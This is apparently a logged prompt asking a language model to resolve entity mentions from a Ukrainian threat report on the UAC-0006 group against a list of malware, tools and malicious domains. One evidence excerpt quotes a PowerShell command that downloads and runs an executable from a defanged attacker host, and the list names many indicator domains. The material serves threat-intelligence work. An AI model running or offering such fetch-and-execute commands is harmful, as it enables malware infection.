=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Зведена інформація щодо діяльності угрупування UAC-0006 станом на 01.12.2023" — evidence: S1. "ння інфікованим комп'ютером здійснюється із застосуванням, щонайменше, 13 різновидів спеціалізованих програм, зокрема:</p><ul><li>SMOKELOADER</li><li>LOADERX3</li><li>RMS</li><li>RDPWRAPPER</li><li>DANABOT</li><li>LUMMASTEALER</li><li>REDLINESTEALER</li><li>SYSTEMBC</li><li>TALESHOT</li><li>PIEJET</li><li>LOADNEST</li><li>HANGTHREAD</li><li>BACKSTAB</li><li>AUKILL</li></ul><p><br></p><p>Загалом, після первинного ураження ЕОМ і доставки SMOKELOADER, останній використовується для завантаження і запуску на ЕОМ інш" S2. "utionPolicy Bypass -File %TMP%\pssD713.ps1 $path = $Env:temp+'\AsmLUkHt.exe'; $client = New-Object System.Net.WebClient; $client.downloadfile('hXXp://downloadrezerves.ru/download11/mstsc.exe',$path); Start-Process -FilePath $path IEX (New-Object Net.Webclient).downloadstring("hXXp://downloadrezerves.ru/index.php") %SY"
Entities:
E1. LoadEdge
E2. PEAKLIGHT
E3. LOADJUMP
E4. SmokeLoader
E5. FileGrabber
E6. Icloud.exe
E7. Usb
E8. MSDriverLoader.exe
E9. PicassoLoader
E10. dropper.exe
E11. NSSM
E12. RAR [aka WinRAR]
E13. CMS Drupal
E14. REMCOSRAT [aka REMCOS RAT]
E15. SuperOps RMM
E16. WMIC
E17. Browsers
E18. 1.Платiжна iнструкцiя iпн та вытяг з реестру Код документа 9312-0580-6944-3255.exe
E19. RDP Wrapper
E20. BORE
E21. Screengrabber
E22. Robocopy
E23. AppLocker
E24. Minesweeper
E25. SaintBot
E26. Dante
E27. Telegram
E28. DarkTortilla
E29. LITEMANAGER
E30. QUASAR RAT
E31. XWORM
E32. MEDUZASTEALER
E33. LUMMASTEALER
E34. PyInstaller
E35. FireEye red team tools
E36. SIEM
E37. ipad.system
E38. SMBEXEC
E39. Syncthing
E40. WordPress
E41. SENDEMAIL
E42. Troldesh
E43. file.htm
E44. Impacket
E45. MASEPIE
E46. POEMGATE
E47. WHITECAT
E48. gowitness
E49. PhantomTools
E50. AsyncRAT
E51. Ngrok
E52. 2.Витяг з реeстру вiд 24.07.2023р_Код документа 9312-0580-6944-3255.xls.js
E53. masscan
E54. MicroBackdoor
E55. Dark Crystal RAT (DCRAT) [aka DARKCRYSTALRAT (DCRAT), DarkCrystal RAT]
E56. microbackdoor.dll
E57. OCEANMAP
E58. base_update.exe
E59. AutoIt
E60. EFAIL
E61. core.dll
E62. Social
E63. PowerShell
E64. RMS
E65. RDPWRAPPER
E66. DANABOT
E67. REDLINESTEALER
E68. SYSTEMBC
E69. TALESHOT
E70. PIEJET
E71. LOADNEST
E72. HANGTHREAD
E73. BACKSTAB
E74. AUKILL
E75. LOADERX3
E76. octoberoctopus.co.za
E77. windacarmelita.pw
E78. grabify.link
E79. mail.lechateaudelatour.fr
E80. ua-compenses.top
E81. abracodabugalimpopo.ru
E82. tax-compenses.xyz
E83. iplogger.com
E84. ukrainecenter.yolasite.com
E85. uatax-compenses.xyz
E86. giraffe-tour.ru
E87. maxteroper.ru
E88. gondurasonline.ru
E89. hopentools.ru
E90. ukrainebayra.com
E91. funedunet.com
E92. nirsoft.me
E93. www.adelaida.ua
E94. anotepad.com
E95. uadop.webflow.io
E96. 1833.site
E97. topibuzz.space
E98. bahouholdings.com
E99. czyrqdnvpujmmjkfhhvs4knf1av02demj.oast.fun
E100. czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast.fun
E101. czyrqdnvpujmmjkfhhvsgapqr3hclnhhj.oast.fun
E102. czyrqdnvpujmmjkfhhvsvlaax17vd5r6v.oast.fun
E103. hillespostelnm.eu
E104. yemmyusa.com
E105. bank.gov.ua
E106. mygraphbook.com
E107. forkscenter.fr
E108. coinmakopenarea.su
E109. compensationukr.com
E110. zaikaopentra.com.ru
E111. tvpharm.ru
E112. mediaplatformapharm.ru
E113. pay.ukr-compens.xyz
E114. ua-compensations.xyz
E115. star-cz.ddns.net
E116. myua-compensations.xyz
E117. kilomunara.com
E118. www.dropbox.com
E119. ukr-net-downloadfile.su
E120. nabufixservice.su
